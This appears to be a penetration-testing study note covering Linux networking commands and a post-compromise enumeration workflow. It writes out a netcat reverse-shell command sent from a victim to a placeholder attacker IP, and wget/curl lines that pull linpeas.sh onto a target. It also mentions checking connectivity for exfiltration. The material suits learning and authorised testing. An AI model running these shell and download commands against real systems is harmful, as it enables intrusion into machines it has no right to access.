#  Networking & Connections 🌐

Networking knowledge is what separates a script kiddie from a real hacker. If you can't map out a network or establish a connection back to your machine, you cannot perform an attack.

## 1. Essential Networking Commands

### `ip` (The Modern Standard)

The old `ifconfig` is deprecated. Use `ip` for everything.

- `ip addr` (or `ip a`): Shows your network interface details (IP address, MAC address).
    
- `ip route`: Shows your gateway/routing table (Where does my traffic go to reach the internet?).
    

### `ss` (Socket Statistics)

Replaces the old `netstat`. Use this to see what ports are listening for connections.

- `ss -tulpn`: The most important command for VAPT.
    
    - `-t` (TCP), `-u` (UDP), `-l` (Listening), `-p` (Process), `-n` (Numeric - shows port numbers instead of names).
        
- **VAPT Note:** If you see a port listening only on `127.0.0.1` (localhost), it is hidden from the external network. You can use **SSH Port Forwarding** to tunnel into that port.
    

### `nc` (Netcat - The "Swiss Army Knife")

If you only learn one tool, make it Netcat.

- **Listener (On your Kali):** `nc -lvnp 4444` (Listens on port 4444).
    
- **Connect (On the victim):** `nc <KALI_IP> 4444 -e /bin/bash` (Sends a reverse shell back).
    

## 2. File Transfers (The "Living off the Land" way)

When you have a shell, you need to bring your tools (`linpeas.sh`, etc.) onto the target.

### A. Python (The Easiest)

- **On your Kali:** `python3 -m http.server 8000`
    
- **On the victim:** `wget http://<KALI_IP>:8000/linpeas.sh` or `curl http://<KALI_IP>:8000/linpeas.sh -o linpeas.sh`
    

### B. `scp` (Secure Copy)

Used to transfer files via SSH.

- `scp payload.sh user@<VICTIM_IP>:/tmp/`
    

## 3. Network Troubleshooting

- `ping <IP>`: Checks if a host is alive (ICMP).
    
- `traceroute <IP>`: Shows the path (hops) your packet takes to reach the target.
    
- `dig` or `nslookup`: Queries DNS servers (useful for enumerating subdomains or mail server records).
    

## 4. VAPT Strategy: Network Enumeration

When you gain shell access, always run this workflow:

1. **Who am I talking to?** `ss -tulpn` (What services are running locally?)
    
2. **What is my internal network?** `ip a` (Do I have multiple network interfaces?)
    
3. **Can I talk to the outside world?** `ping -c 3 google.com` (Check for internet connectivity for exfiltration).
    
4. **Is there a firewall?** Use `nmap` (if installed) or manual port probing with `nc` to see if certain ports are blocked.

---
